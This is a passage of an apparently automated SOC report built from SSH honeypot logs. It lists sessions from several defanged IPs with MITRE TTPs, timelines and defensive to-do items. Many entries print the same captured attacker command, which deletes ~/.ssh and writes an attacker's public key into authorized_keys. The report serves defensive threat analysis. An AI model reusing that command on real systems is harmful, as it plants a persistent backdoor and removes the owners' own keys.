| `2026-04-24 17:36:23` | `cowrie.command.failed` |
| `2026-04-24 17:36:23` | `cowrie.log.closed` |
| `2026-04-24 17:36:23` | `cowrie.session.params` |
| `2026-04-24 17:36:23` | `cowrie.command.input` |
| `2026-04-24 17:36:23` | `cowrie.session.file_download` |
| `2026-04-24 17:36:23` | `cowrie.log.closed` |
| `2026-04-24 17:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5a608157242

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:36 |
| **Last Seen** | 2026-04-24 17:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:36:25` | `cowrie.session.connect` |
| `2026-04-24 17:36:25` | `cowrie.client.version` |
| `2026-04-24 17:36:25` | `cowrie.client.kex` |
| `2026-04-24 17:36:25` | `cowrie.login.success` |
| `2026-04-24 17:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b2dfe78f029

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:36 |
| **Last Seen** | 2026-04-24 17:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:36:36` | `cowrie.session.connect` |
| `2026-04-24 17:36:36` | `cowrie.client.version` |
| `2026-04-24 17:36:36` | `cowrie.client.kex` |
| `2026-04-24 17:36:37` | `cowrie.login.success` |
| `2026-04-24 17:36:37` | `cowrie.session.params` |
| `2026-04-24 17:36:37` | `cowrie.command.input` |
| `2026-04-24 17:36:37` | `cowrie.command.failed` |
| `2026-04-24 17:36:37` | `cowrie.log.closed` |
| `2026-04-24 17:36:37` | `cowrie.session.params` |
| `2026-04-24 17:36:37` | `cowrie.command.input` |
| `2026-04-24 17:36:38` | `cowrie.session.file_download` |
| `2026-04-24 17:36:38` | `cowrie.log.closed` |
| `2026-04-24 17:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6ec1af8de4c

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:36 |
| **Last Seen** | 2026-04-24 17:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:36:40` | `cowrie.session.connect` |
| `2026-04-24 17:36:40` | `cowrie.client.version` |
| `2026-04-24 17:36:40` | `cowrie.client.kex` |
| `2026-04-24 17:36:40` | `cowrie.login.success` |
| `2026-04-24 17:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eeefcb7580a

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:37 |
| **Last Seen** | 2026-04-24 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:37:51` | `cowrie.session.connect` |
| `2026-04-24 17:37:51` | `cowrie.client.version` |
| `2026-04-24 17:37:51` | `cowrie.client.kex` |
| `2026-04-24 17:37:51` | `cowrie.login.success` |
| `2026-04-24 17:37:51` | `cowrie.session.params` |
| `2026-04-24 17:37:51` | `cowrie.command.input` |
| `2026-04-24 17:37:51` | `cowrie.command.failed` |
| `2026-04-24 17:37:51` | `cowrie.log.closed` |
| `2026-04-24 17:37:51` | `cowrie.session.params` |
| `2026-04-24 17:37:51` | `cowrie.command.input` |
| `2026-04-24 17:37:51` | `cowrie.session.file_download` |
| `2026-04-24 17:37:51` | `cowrie.log.closed` |
| `2026-04-24 17:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3ced8a57439

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:37 |
| **Last Seen** | 2026-04-24 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:37:52` | `cowrie.session.connect` |
| `2026-04-24 17:37:52` | `cowrie.client.version` |
| `2026-04-24 17:37:52` | `cowrie.client.kex` |
| `2026-04-24 17:37:52` | `cowrie.login.success` |
| `2026-04-24 17:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0074a65db62

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:38 |
| **Last Seen** | 2026-04-24 17:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:38:26` | `cowrie.session.connect` |
| `2026-04-24 17:38:26` | `cowrie.client.version` |
| `2026-04-24 17:38:26` | `cowrie.client.kex` |
| `2026-04-24 17:38:27` | `cowrie.login.success` |
| `2026-04-24 17:38:27` | `cowrie.session.params` |
| `2026-04-24 17:38:27` | `cowrie.command.input` |
| `2026-04-24 17:38:27` | `cowrie.command.failed` |
| `2026-04-24 17:38:27` | `cowrie.log.closed` |
| `2026-04-24 17:38:27` | `cowrie.session.params` |
| `2026-04-24 17:38:27` | `cowrie.command.input` |
| `2026-04-24 17:38:27` | `cowrie.session.file_download` |
| `2026-04-24 17:38:27` | `cowrie.log.closed` |
| `2026-04-24 17:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9af2c8cc371

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:38 |
| **Last Seen** | 2026-04-24 17:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:38:29` | `cowrie.session.connect` |
| `2026-04-24 17:38:29` | `cowrie.client.version` |
| `2026-04-24 17:38:29` | `cowrie.client.kex` |
| `2026-04-24 17:38:30` | `cowrie.login.success` |
| `2026-04-24 17:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e97e8de8fde7

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:39 |
| **Last Seen** | 2026-04-24 17:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:39:17` | `cowrie.session.connect` |
| `2026-04-24 17:39:17` | `cowrie.client.version` |
| `2026-04-24 17:39:17` | `cowrie.client.kex` |
| `2026-04-24 17:39:18` | `cowrie.login.success` |
| `2026-04-24 17:39:18` | `cowrie.session.params` |
| `2026-04-24 17:39:18` | `cowrie.command.input` |
| `2026-04-24 17:39:18` | `cowrie.command.failed` |
| `2026-04-24 17:39:18` | `cowrie.log.closed` |
| `2026-04-24 17:39:19` | `cowrie.session.params` |
| `2026-04-24 17:39:19` | `cowrie.command.input` |
| `2026-04-24 17:39:19` | `cowrie.session.file_download` |
| `2026-04-24 17:39:19` | `cowrie.log.closed` |
| `2026-04-24 17:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a498d411d768

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-24 17:39 |
| **Last Seen** | 2026-04-24 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:39:21` | `cowrie.session.connect` |
| `2026-04-24 17:39:21` | `cowrie.client.version` |
| `2026-04-24 17:39:21` | `cowrie.client.kex` |
| `2026-04-24 17:39:21` | `cowrie.login.success` |
| `2026-04-24 17:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8b1e6104408

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:39 |
| **Last Seen** | 2026-04-24 17:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:39:31` | `cowrie.session.connect` |
| `2026-04-24 17:39:31` | `cowrie.client.version` |
| `2026-04-24 17:39:31` | `cowrie.client.kex` |
| `2026-04-24 17:39:31` | `cowrie.login.success` |
| `2026-04-24 17:39:31` | `cowrie.session.params` |
| `2026-04-24 17:39:31` | `cowrie.command.input` |
| `2026-04-24 17:39:31` | `cowrie.command.failed` |
| `2026-04-24 17:39:31` | `cowrie.log.closed` |
| `2026-04-24 17:39:31` | `cowrie.session.params` |
| `2026-04-24 17:39:31` | `cowrie.command.input` |
| `2026-04-24 17:39:32` | `cowrie.session.file_download` |
| `2026-04-24 17:39:32` | `cowrie.log.closed` |
| `2026-04-24 17:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec152d83a178

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:39 |
| **Last Seen** | 2026-04-24 17:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:39:33` | `cowrie.session.connect` |
| `2026-04-24 17:39:33` | `cowrie.client.version` |
| `2026-04-24 17:39:33` | `cowrie.client.kex` |
| `2026-04-24 17:39:33` | `cowrie.login.success` |
| `2026-04-24 17:39:34` | `cowrie.session.params` |
| `2026-04-24 17:39:34` | `cowrie.command.input` |
| `2026-04-24 17:39:34` | `cowrie.command.failed` |
| `2026-04-24 17:39:34` | `cowrie.log.closed` |
| `2026-04-24 17:39:34` | `cowrie.session.params` |
| `2026-04-24 17:39:34` | `cowrie.command.input` |
| `2026-04-24 17:39:34` | `cowrie.session.file_download` |
| `2026-04-24 17:39:34` | `cowrie.log.closed` |
| `2026-04-24 17:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46250e3cb4cc

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:39 |
| **Last Seen** | 2026-04-24 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:39:34` | `cowrie.session.connect` |
| `2026-04-24 17:39:34` | `cowrie.client.version` |
| `2026-04-24 17:39:34` | `cowrie.client.kex` |
| `2026-04-24 17:39:34` | `cowrie.login.success` |
| `2026-04-24 17:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a9a7c3484d

| Field | Detail |
|---|---|
| **Source IP** | `171.244.141[.]86` |
| **First Seen** | 2026-04-24 17:39 |
| **Last Seen** | 2026-04-24 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:39:36` | `cowrie.session.connect` |
| `2026-04-24 17:39:36` | `cowrie.client.version` |
| `2026-04-24 17:39:36` | `cowrie.client.kex` |
| `2026-04-24 17:39:36` | `cowrie.login.success` |
| `2026-04-24 17:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.141[.]86` to AbuseIPDB if not already reported
- [ ] Block `171.244.141[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e41d96c3096c

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:42 |
| **Last Seen** | 2026-04-24 17:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:42:24` | `cowrie.session.connect` |
| `2026-04-24 17:42:24` | `cowrie.client.version` |
| `2026-04-24 17:42:24` | `cowrie.client.kex` |
| `2026-04-24 17:42:24` | `cowrie.login.success` |
| `2026-04-24 17:42:25` | `cowrie.session.params` |
| `2026-04-24 17:42:25` | `cowrie.command.input` |
| `2026-04-24 17:42:25` | `cowrie.command.failed` |
| `2026-04-24 17:42:25` | `cowrie.log.closed` |
| `2026-04-24 17:42:25` | `cowrie.session.params` |
| `2026-04-24 17:42:25` | `cowrie.command.input` |
| `2026-04-24 17:42:25` | `cowrie.session.file_download` |
| `2026-04-24 17:42:25` | `cowrie.log.closed` |
| `2026-04-24 17:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bea18a575a3

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:42 |
| **Last Seen** | 2026-04-24 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:42:27` | `cowrie.session.connect` |
| `2026-04-24 17:42:27` | `cowrie.client.version` |
| `2026-04-24 17:42:27` | `cowrie.client.kex` |
| `2026-04-24 17:42:28` | `cowrie.login.success` |
| `2026-04-24 17:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6291b5e4c1f4

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:43 |
| **Last Seen** | 2026-04-24 17:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:43:30` | `cowrie.session.connect` |
| `2026-04-24 17:43:30` | `cowrie.client.version` |
| `2026-04-24 17:43:30` | `cowrie.client.kex` |
| `2026-04-24 17:43:31` | `cowrie.login.success` |
| `2026-04-24 17:43:31` | `cowrie.session.params` |
| `2026-04-24 17:43:31` | `cowrie.command.input` |
| `2026-04-24 17:43:31` | `cowrie.command.failed` |
| `2026-04-24 17:43:31` | `cowrie.log.closed` |
| `2026-04-24 17:43:32` | `cowrie.session.params` |
| `2026-04-24 17:43:32` | `cowrie.command.input` |
| `2026-04-24 17:43:32` | `cowrie.session.file_download` |
| `2026-04-24 17:43:32` | `cowrie.log.closed` |
| `2026-04-24 17:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-019cfde408a5

| Field | Detail |
|---|---|
| **Source IP** | `103.78.1[.]33` |
| **First Seen** | 2026-04-24 17:43 |
| **Last Seen** | 2026-04-24 17:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:43:34` | `cowrie.session.connect` |
| `2026-04-24 17:43:34` | `cowrie.client.version` |
| `2026-04-24 17:43:34` | `cowrie.client.kex` |
| `2026-04-24 17:43:34` | `cowrie.login.success` |
| `2026-04-24 17:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.78.1[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.78.1[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c2e1533f814

